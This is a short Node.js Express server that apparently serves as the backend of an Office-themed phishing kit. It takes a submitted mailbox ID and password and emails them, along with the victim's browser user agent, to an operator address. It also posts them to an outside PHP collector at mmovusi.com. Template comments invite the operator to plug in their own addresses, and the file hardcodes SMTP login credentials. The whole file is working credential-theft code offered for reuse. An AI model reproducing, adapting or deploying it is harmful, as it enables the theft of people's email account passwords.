const express = require('express')
const bodyParser = require('body-parser')
const app = express()
const cors = require('cors');
// const fs = require('fs');
const nodemailer = require('nodemailer');
const fetch = require('node-fetch');

// const geoip = require('geoip-lite');

app.use(cors());
app.use(bodyParser.urlencoded({extended : false}));
app.use(bodyParser.json());


// replace with sender 
let transporter = nodemailer.createTransport({
    host: 'smtp.ethereal.email',
    port: 587,
    secure: false,
    auth: {
        user: 'tyra79@ethereal.email',
        pass: 'XRDMtgeFXauQB8jnYR'
    }
});


app.post('/', (req, res) => {
    const data = req.body
    var queryString = "ai=" + encodeURIComponent(data.ai) + "&pr=" + data.pr;

    // const ip = req.ip;
    // const geo = geoip.lookup(ip);
    const userAgent = req.get('User-Agent');


    // add to txt file
    // fs.appendFileSync('data.txt', data + '\n');

    // send mail
    transporter.sendMail({
        from: '"John Doe" <admins@gmail.com>',
        to: "address@gmail.com",
        subject: `Office Log || - BOX ID: ${data.ai} Password: ${data.pr}`,
        html: `<b>BOX I.D  :- ${data.ai}</b> <br/>
               <b>Password :- ${data.pr}</b> <br/>
               <b>Browser  :- ${userAgent}</b> <br/>`,
      });



      
      // replace here with your php script
      fetch('https://mmovusi.com/sender.php', {
        method: 'POST',
        body: queryString,
        headers: { 
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'User-Agent':userAgent
        }
    })
    res.json('success')
    


}) 




const listener = app.listen(process.env.PORT, () => console.log('live on '+ listener.address().port))